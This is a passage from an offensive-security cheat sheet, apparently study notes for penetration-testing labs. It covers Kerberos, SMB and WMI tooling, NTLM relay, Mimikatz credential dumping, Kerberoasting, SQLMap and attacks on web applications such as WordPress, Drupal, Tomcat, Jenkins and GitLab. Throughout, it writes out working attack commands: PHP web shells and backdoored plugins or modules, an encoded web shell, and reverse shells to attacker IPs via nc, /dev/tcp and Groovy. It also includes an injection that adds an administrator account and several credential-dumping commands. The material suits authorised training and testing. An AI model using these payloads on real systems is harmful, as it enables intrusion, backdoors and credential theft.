- Renew a Ticket

```shell
Kerb renew -Ticket <USERNAME>.kirbi -OutputFileName <USERNAME>.kirbi -Overwrite <RHOST>
Kerb renew -TicketCache <USERNAME>.ccache <RHOST> -TargetSpn cifs/<RHOST>
```

#### select

- Inspect / Convert / Filter Ticket Files

```shell
Kerb select -From <USERNAME>*.kirbi
Kerb select -From <USERNAME>*.kirbi -Current
Kerb select -From <USERNAME>*.kirbi -MatchingSpn 'krbtgt/.*'
Kerb select -From <USERNAME>*.kirbi -MatchingSpn 'cifs/.*'
Kerb select -From <USERNAME>*.kirbi -Into all-tickets.kirbi
```

#### changepw

- Change own Password

```shell
Kerb changepw <USERNAME>@<DOMAIN> <RHOST> -Password '<PASSWORD>' <PASSWORD>
```

#### setpw

- Set Another Account's Password

```shell
Kerb setpw -UserName <USERNAME>@<DOMAIN> -Kdc <RHOST> -Password '<PASSWORD>' <USERNAME>@<DOMAIN> <PASSWORD>
```

#### s2k

- Generate Protocol Keys from a Password

```shell
Kerb s2k <DOMAIN><USERNAME> '<PASSWORD>'
Kerb s2k <DOMAIN><USERNAME> '<PASSWORD>' -EncTypes Aes128CtsHmacSha1_96,Aes256CtsHmacSha1_96
Kerb s2k <DOMAIN>host<HOSTNAME>.<FQDN> '<PASSWORD>'
```

#### Smb2Client

SMB2 file operations, share and session enumeration, symlink/junction creation, and server-level queries.

UNC path format: `\\<SERVER>[:<PORT>]\<SHARE>[\<PATH>]`

#### ls

- List Directory Contents

```shell
Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -p '<PASSWORD>'
Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>'
Smb2Client ls '\\<RHOST>\IPC$' -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>'
Smb2Client ls '\\<RHOST>\<SHARE>' -ha <RHOST> -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>'
Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -ud <DOMAIN> -NtlmHash <HASH>
Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>' -Kdc <RHOST>
```

**get**

- Download Files

```shell
Smb2Client get '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
Smb2Client get '\\<RHOST>\<SHARE>\<FILE>' <LFILE> -u <USERNAME> -p '<PASSWORD>'
Smb2Client get '\\<RHOST>\<SHARE>\*.txt' <LDIR> -depth 20 -u <USERNAME> -p '<PASSWORD>'
Smb2Client get '\\<RHOST>\<SHARE>\<DIR>' <LDIR> -depth -1 -u <USERNAME> -p '<PASSWORD>'
```

#### put

- Upload Files

```shell
Smb2Client put '\\<RHOST>\<SHARE>\<FILE>' <LFILE> -u <USERNAME> -p '<PASSWORD>'
Smb2Client put '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
```

#### rm / rmdir

- Delete Files and Directories

```shell
Smb2Client rm '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
Smb2Client rmdir '\\<RHOST>\<SHARE>\<DIR>' -u <USERNAME> -p '<PASSWORD>'
```

#### mkdir

- Create Directory

```shell
Smb2Client mkdir '\\<RHOST>\<SHARE>\<DIR>' -u <USERNAME> -p '<PASSWORD>'
Smb2Client mkdir '\\<RHOST>\<SHARE>\<DIR>' -Parents -u <USERNAME> -p '<PASSWORD>'
```

#### mklink

- Create Symbolic Link

```shell
Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -u <USERNAME> -p '<PASSWORD>'
Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -Relative -u <USERNAME> -p '<PASSWORD>'
Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -Directory -u <USERNAME> -p '<PASSWORD>'
```

#### mount / umount

- Junction / Mount Point

```shell
Smb2Client mount '\\<RHOST>\<SHARE>\<FOLDER>' <TARGET> -u <USERNAME> -p '<PASSWORD>'
Smb2Client umount '\\<RHOST>\<SHARE>\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
```

#### touch

- Timestomp / Update Attributes

```shell
Smb2Client touch '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
```

#### watch

- Monitor Directory Changes

```shell
Smb2Client watch '\\<RHOST>\<SHARE\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
```

#### enumshares

- Enumerate Shares

```shell
Smb2Client enumshares <RHOST> -u <USERNAME> -p '<PASSWORD>'
```

#### enumsessions

- Enumerate Active Sessions

```shell
Smb2Client enumsessions <RHOST> -u <USERNAME> -p '<PASSWORD>'
Smb2Client enumsessions <RHOST> -u <USERNAME> -p '<PASSWORD>' -ClientUserName <USERNAME>
```

#### enumopenfiles

- Enumerate Open Files

```shell
Smb2Client enumopenfiles <RHOST> -u <USERNAME> -p '<PASSWORD>'
Smb2Client enumopenfiles <RHOST> -u <USERNAME> -p '<PASSWORD>' -OpenBy <USERNAME>
```

#### enumnics

- Enumerate Network Interfaces

```shell
Smb2Client enumnics '\\<RHOST>\<SHARE>' -u <USERNAME> -p '<PASSWORD>'
```

#### enumsnapshots

- Enumerate VSS Snapshots

```shell
Smb2Client enumsnapshots '\\<RHOST>\<SHARE>\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
```

#### enumstreams

- Enumerate Alternate Data Streams

```shell
Smb2Client enumstreams '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
```

**Wmi**

Interact with Windows Management Instrumentation over RPC: run WQL queries, invoke methods, execute commands, and manage the WMI repository.

#### query

- Execute WQL Query

```shell
Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' 'SELECT * FROM Win32_Process'
Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' -OutputFields Caption,ProcessID,ParentProcessID 'SELECT * FROM Win32_Process'
Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root\\cimv2 '<QUERY>'
```

**get**

- Retrieve a WMI Object

```shell
Wmi get -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process
Wmi get -u <USERNAME> -p '<PASSWORD>' <RHOST> "Win32_LogicalDisk.DeviceID='C:'"
```

#### invoke

- Invoke a WMI Method

```shell
Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process Create <COMMAND>
Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process.Handle=<PID> Terminate
Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> "SELECT * FROM Win32_Process WHERE Caption='<PROCESS>'" Terminate
```

#### exec

- Execute Command via WMI

```shell
Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> <COMMAND>
Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> -WorkingDir 'C:\Windows\Temp' <COMMAND>
Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> -PollInterval 100ms <COMMAND>
Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> -CaptureOutput:off <COMMAND>
```

#### lsns

- List WMI Namespaces

```shell
Wmi lsns <RHOST> -u <USERNAME> -p '<PASSWORD>'
Wmi lsns <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root
```

#### lsclass

- List WMI Classes

```shell
Wmi lsclass <RHOST> -u <USERNAME> -p '<PASSWORD>'
Wmi lsclass <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root\\cimv2
```

#### lsprop

- List Properties of a WMI Class or Object

```shell
Wmi lsprop -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process
Wmi lsprop -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers Privileges=SeDebugPrivilege Win32_Process
```

#### lsmethod

- List Methods of a WMI Class or Object

```shell
Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process
Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers static Win32_Process
Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers Privileges=SeDebugPrivilege Win32_Process
```

#### backup / restore

- WMI Repository

```shell
Wmi backup -u <USERNAME> -p '<PASSWORD>' <RHOST> 'C:\Windows\Temp\wmi.bak'
Wmi restore -u <USERNAME> -p '<PASSWORD>' <RHOST> 'C:\Windows\Temp\wmi.bak'
```

#### delete

- Delete WMI Object

```shell
Wmi delete -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process.Handle=<PID>
Wmi delete -u <USERNAME> -p '<PASSWORD>' <RHOST> "SELECT * FROM Win32_Process WHERE Caption='<PROCESS>'"
```

### SMB Relay Attack

```
python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support #Capture creds via SMB (Signing must be 'disabled/not required')

python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support -i # Gain a interactive shell with "-i"
```

### IPv6 Attack

```
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

sudo mitm6 -d marvel.local #Run mitm6 first to IPv6 server

python3 /home/kali/.local/bin/ntlmrelayx.py -6 -t ldaps://192.168.68.122 -wh fakewpad.marvel.local -l lootme # Captures IPv6 request to capture & dump creds to lootme
```

### AD Recon (OSCP)

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-attacks

https://github.com/61106960/adPEAS #asPeas for enumeration scripting

#### PowerView
```
https://gist.github.com/HarmJ0y/<NTLM_HASH> # Cheat Sheet
```

#### Bloodhound
```
AzureHound for Azure Active Directory # Install-Module -name Az -AllowClobber | Install-Module -name AzureADPreview -AllowClobber

SharpHound for local Active Directory # run the collector on the machine using SharpHound

"Invoke-BloodHound -CollectionMethod All  -Domain <DomainName> -ZipFileName <file.zip>" # copy zip over to attack machine to run in neo4j DB
```

#### Mimikatz Commands
https://gist.github.com/TarlogicSecurity/<NTLM_HASH>  #Kerberoasting Cheatsheet
```
lsadump::sam #Dumps passwords/hashes in sam file
lsadump::secrets #Dumps passwords

lsadump::dcsync /domain:corp.com /user:jeff_admin #Creates a ntlm hash from DC for lateral move

## Invoke-Mimikatz
Invoke-Mimikatz -DumpCreds -ComputerName XOR-APP59

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

## Ticket Grabbing
net use \\dc01 #Creates a TGS with a domain user

#Invoke-Kerberoast.ps1 to dump tickets:
Import-Module .\Invoke-Kerberoast.ps1

Next type: PS C:\Users\Public> Invoke-Kerberoast.ps1

#Grabbing ticket hashes for hashcat:
Invoke-Kerberoast -OutputFormat Hashcat | % {$_.Hash} | Out-File -Encoding ascii hashes.hashcat

hashcat -m 13100 -a 0 -o cracked.txt hashes.hashcat /home/kali/rockyou.txt  ##Use SMBserver to transfer hashes

# Grabbing tickets for john:
PS C:\Tools\active_directory> Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$<KERBEROS_HASH>')}

sudo john --format=krb5tgs hash.txt --wordlist=/home/kali/rockyou.txt  #Use SMBserver to transfer hashes
```

## 11. SQLMap

```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an injection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=<CSRF_TOKEN>" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

### Advanced SQLMap Options

```bash
# Detection and tuning
sqlmap -u "http://<TARGET>/?id=1" --level=5 --risk=3
sqlmap -u "http://<TARGET>/?id=1" --technique=BEUSTQ
sqlmap -u "http://<TARGET>/?id=1" --dbms=mysql
sqlmap -u "http://<TARGET>/?id=1" --batch --threads=10

# Request options
sqlmap -r request.txt
sqlmap -u "http://<TARGET>/?id=1" --cookie="<COOKIE_NAME>=<COOKIE_VALUE>"
sqlmap -u "http://<TARGET>/?id=1" --headers="X-Forwarded-For: 127.0.0.1"
sqlmap -u "http://<TARGET>/?id=1" --random-agent
sqlmap -u "http://<TARGET>/?id=1" --proxy=http://127.0.0.1:8080

# Enumeration
sqlmap -u "http://<TARGET>/?id=1" --dbs
sqlmap -u "http://<TARGET>/?id=1" -D <DB> --tables
sqlmap -u "http://<TARGET>/?id=1" -D <DB> -T <TABLE> --columns
sqlmap -u "http://<TARGET>/?id=1" -D <DB> -T <TABLE> --dump
sqlmap -u "http://<TARGET>/?id=1" --dump-all
sqlmap -u "http://<TARGET>/?id=1" --search -T user
sqlmap -u "http://<TARGET>/?id=1" --passwords --privileges --roles

# WAF/CSRF bypass
sqlmap -u "http://<TARGET>/?id=1" --tamper=<TAMPER_SCRIPT>
sqlmap -u "http://<TARGET>/?id=1" --randomize=<PARAM>
sqlmap -u "http://<TARGET>/?id=1" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

# OS/file access (requires DBA privileges)
sqlmap -u "http://<TARGET>/?id=1" --is-dba
sqlmap -u "http://<TARGET>/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://<TARGET>/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
sqlmap -u "http://<TARGET>/?id=1" --os-shell
sqlmap -u "http://<TARGET>/?id=1" --os-pwn
```

Use `--batch` for automation, `-v 3` for payload visibility, and `--flush-session` after changing the target or options.

## 12. Attacking Common Web Applications

### Application Enumeration

```
- nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
- eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
- cat web_discovery.xml | ./aquatone -nmap

```

### WordPress

```
- curl -s http://blog.inlanefreight.local | grep WordPress
- curl -s http://blog.inlanefreight.local/ | grep themes
- curl -s http://blog.inlanefreight.local/ | grep plugins
- curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
- http://blog.inlanefreight.local/wp-login.php
- sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <WPSCAN_API_TOKEN>
- wpscan --url http://blog.inlanefreight.local/
- user enum
	-  wpscan --url http://blog.inlanefreight.local --enumerate u
-  Brute force
	-  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
- Command injection or Code Execution
	- login with admin --> http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
	- update file --> system($_GET[0]);
	- curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
- mfs
	- use exploit/unix/webapp/wp_admin_shell_upload
- Vulnerable Plugins - mail-masta
	- curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
- Vulnerable Plugins - wpDiscuz
	- python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
- curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

#### Malicious Wordpress Plugin

```shell
mkdir shell-plugin/
```

```shell
cat > shell-plugin/shell-plugin.php <<'EOF'
<?php
/*
Plugin Name: Shell Plugin
Version: 1.0
*/
if (isset($_REQUEST['c'])) {
    system($_REQUEST['c']);
}
EOF
```

```shell
zip -r shell-plugin.zip shell-plugin
```

```shell
curl -sk 'http://<RHOST>/wp-content/plugins/shell-plugin/shell-plugin.php?c=id'
```

```shell
wpprobe scan -u https://<RHOST>/
wpprobe scan -f <FILE>.txt -t 20
```

```shell
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

### Joomla

```
- curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
- curl -s http://dev.inlanefreight.local/ | grep Joomla
- curl -s http://dev.inlanefreight.local/README.txt | head -n 5
- curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
- sudo pip3 install droopescan
	- droopescan scan joomla --url http://dev.inlanefreight.local/

-  python2 -m pip install bs4
	- python2 joomlascan.py -u http://dev.inlanefreight.local
	- sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

	- curl -s http://dev.inlanefreight.local/templates/protostar/error.php?<NTLM_HASH>=id
- CVE-2019-10945
	- https://github.com/dpgg101/CVE-2019-10945
	- python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username <USER> --password <PASSWORD> --dir /

```

### Drupal

```
- curl -s http://drupal.inlanefreight.local | grep Drupal
- curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
- curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
- droopescan scan drupal -u http://drupal.inlanefreight.local
- https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html

- Leveraging the PHP Filter Module
	- log in as an admin and enable the PHP filter module --> check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.
	- create a page with a malicious PHP snippet system($_GET['cmd']);  We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to 	an attacker during our assessment.
	- set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3.
	- curl -s http://drupal-qa.inlanefreight.local/node/3?<NTLM_HASH>=id | grep uid | cut -f4 -d">"

- Leveraging the PHP Filter Module (version 8 )
	- wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
	- Once downloaded go to Administration > Reports > Available updates. http://drupal.inlanefreight.local/admin/reports/updates/install
	- Browse, select the file from the directory we downloaded it to, and then click Install.
	- Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

- Uploading a Backdoored Module
	- Download the archive and extract its contents.
	- get --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
	- tar xvf captcha-8.x-1.2.tar.gz
	- Create a PHP web shell with the contents:
		<?php
		system($_GET['<NTLM_HASH>']);
		?>
	- Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
		<IfModule mod_rewrite.c>
		RewriteEngine On
		RewriteBase /
		</IfModule>
	- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
		- mv shell.php .htaccess captcha
		- tar cvf captcha.tar.gz captcha/
		- Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, 			such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.
		- curl -s drupal.inlanefreight.local/modules/captcha/shell.php?<NTLM_HASH>=id

- Leveraging Known Vulnerabilities
	- Drupalgeddon
		- POC:- https://www.exploit-db.com/exploits/34992
		- python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p <PASSWORD>
		- Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
		- We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.
	- Drupalgeddon2
		- POC:- https://www.exploit-db.com/exploits/44448
		- python3 drupalgeddon2.py
		- curl -s http://drupal-dev.inlanefreight.local/hello.txt
		- Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
			<?php system($_GET[<NTLM_HASH>]);?>
		- echo '<?php system($_GET[<NTLM_HASH>]);?>' | base64
		- echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
		- run the modified exploit script to upload our malicious PHP file.
		- python3 drupalgeddon2.py
		- curl http://drupal-dev.inlanefreight.local/mrb3n.php?<NTLM_HASH>=id
	-Drupalgeddon3
		- POC:- https://github.com/rithchard/Drupalgeddon3
		- Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this 		using Metasploit, but we must first log in and obtain a valid session cookie.
		- Once we have the session cookie, we can set up the exploit module as follows.
			- multi/http/drupal_drupageddon3
			- set rhosts 10.129.42.195
			- set VHOST drupal-acc.inlanefreight.local
			- set drupal_session SESS<ID>=<SESSION_VALUE>
			- set DRUPAL_NODE 1
			- set LHOST 10.10.14.15
			- show options
			- exploit
			- meterpreter > getuid

```

### Tomcat

```
- gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
-  hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -s 8180 app-dev.inlanefreight.local http-get /manager/html
- msf6 auxiliary(scanner/http/tomcat_mgr_login)

- WEB SHELL IN TOMCAT
	- wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
	- zip -r backup.war cmd.jsp
	# OR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
	- curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

- Ghostcat
	- https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
	- python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

```

### Splunk

```
- The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are <DEFAULT_CREDS>
- The Splunk Enterprise trial converts to a free version after 60 days, which doesn't require authentication
- https://github.com/0xjpuff/reverse_shell_splunk
- user@htb[/htb]$ tree splunk_shell/
	splunk_shell/
	├── bin
	└── default
- We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
	@ECHO OFF
	PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
	Exit
- Once the files are created, we can create a tarball or .spl file.
	user@htb[/htb]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
- The next step is to choose Install app from file and upload the application.
	https://10.129.201.50:8000/en-US/manager/search/apps/local
- Before uploading the malicious custom app, let's start a listener using Netcat or socat.
	user@htb[/htb]$ sudo nc -lnvp 443
```

### PRTG

```
- curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
- Default credentials <DEFAULT_CREDS>
- try brute force
- check CVEs for older versions
- check command injection via https://www.codewatch.org/blog/?p=453
	- Setup in the top right and then the Account Settings menu and finally click on Notifications.
	- Add new notification. -> next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1
	- in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 <NEW_PASSWORD> /add;net localgroup administrators prtgadm1 /add --> Save
	- Notifications -->  see our new notification named pwn in the list. --> After clicking Test we will get a pop-up that says EXE notification is queued up.
	- Since this is a blind command execution, we need check by crackmap or impacktools
	- sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p <NEW_PASSWORD>
	- impacket-psexec APP03/prtgadm1:'<NEW_PASSWORD>'@10.129.201.50

```

### GitLab

```
- https://www.exploit-db.com/exploits/49821
	- ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
- https://www.exploit-db.com/exploits/49951
	- python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

### CGI

```
- ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
- user@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
- gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
- try command injection
	- http://10.129.204.227:8080/cgi/welcome.bat?&dir
	- http://10.129.204.227:8080/cgi/welcome.bat?&set
	- http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
	- http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

- curl -i http://10.129.204.231/cgi-bin/access.cgi
	- curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
	- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.38/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
	- sudo nc -lvnp 7777
```

### ColdFusion

```
- nmap -p- -sC -Pn 10.129.247.30 --open --> 8500/tcp open fmtp (ColdFusion SSL default port)
- To know the version --> /CFIDE/administrator

- Attacking ColdFusion
	- searchsploit adobe coldfusion
		- Directory Traversal
			1) http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en OR http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
			OR
			2) searchsploit -p 14641
				- cp /usr/share/exploitdb/exploits/multiple/remote/14641.py
				- python2 14641.py
				- python2 14641.py 10.129.204.230 8500
		- RCE
			1) http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
			OR
			2) http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
			OR
			3) searchsploit -p 50057
				- cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
				- python3 50057.py

```

### IIS Tilde Enumeration

```
- nmap -p- -sV -sC --open 10.129.224.91 --> _http-server-header: Microsoft-IIS/7.5 which is IIS is running
- Install IIS-shortname-scanner from here https://github.com/irsdl/IIS-ShortName-Scanner , also you will find how to install oracle java https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/
-  java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
- Generate a wordlist starting with `transf`
	- egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
	- gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

```

### LDAP

```
- nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

# ldapsearch:- ldapsearch is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.
	- ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "ou=people,dc=example,dc=com" "(mail=<EMAIL>)"

# LDAP Injection by using * in username field OR by using * in password field
	$username = "*";
	$password="<PASSWORD>";
	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

# OR
	$username = "dummy";
	$password="<PASSWORD>";
	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

# OR
	$username = "*"
	$password="<PASSWORD>"
```

### Jenkins

```
1) Default credentials
2) Bruteforce
3) Script Console
	- http://jenkins.inlanefreight.local:8000/script
	- 		def cmd = 'id'
		def sout = new StringBuffer(), serr = new StringBuffer()
		def proc = cmd.execute()
		proc.consumeProcessOutput(sout, serr)
		proc.waitForOrKill(1000)
		println sout
	- Run

	# OR — Reverse shell

		r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()
	- nc -lvnp 8443

	# OR — via Windows
	- Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. We could run commands on a Windows-based Jenkins install using this snippet:

	# OR — via Windows
	- https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy

```

### osTicket, Thick Clients, Mass Assignment & Hardening

#### osTicket

- Discover the help desk at `/osticket/`, `/support/`, or a dedicated vhost.
- Enumerate version, tickets, and exposed configuration.
- Check for default/weak admin credentials and known CVEs.
- Sensitive files: `include/ost-config.php`, database backups, email configuration.

```bash
curl -s http://<TARGET>/osticket/
curl -s http://<TARGET>/osticket/include/ost-config.php
searchsploit osticket
```

#### Thick Client Applications

- Inspect with Procmon, Process Explorer, and Strings.
- Decompile .NET/JAR clients with dnSpy, ILSpy, or JD-GUI.
- Proxy traffic with Burp/ZAP/Fiddler; check for hardcoded credentials and API keys.
